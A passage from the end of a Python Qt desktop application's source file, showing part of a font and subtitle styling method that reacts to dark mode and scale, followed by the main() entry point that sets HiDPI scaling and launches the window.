        self.lbl_header.setFont(
            QFont("Courier New", header_size, QFont.Weight.Bold)
        )

        # 4. Update subtitle inline stylesheet (font-size in px, not pt)
        sub_color = "#2e5a2e" if self._dark_mode else "#4a7a4a"
        sub_size  = max(8, int(11 * scale))
        self.lbl_sub.setStyleSheet(
            f"color: {sub_color}; letter-spacing: 3px; font-size: {sub_size}px;"
        )


# ─────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────

def main():
    # Enable HiDPI awareness — let Qt report fractional scale factors
    # (e.g. 1.5× on 4K) so the font-scale combo can compensate correctly
    QApplication.setHighDpiScaleFactorRoundingPolicy(
        Qt.HighDpiScaleFactorRoundingPolicy.PassThrough
    )
    app = QApplication(sys.argv)
    app.setStyleSheet(_make_style(dark=True, scale=1.0))
    window = MainWindow()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
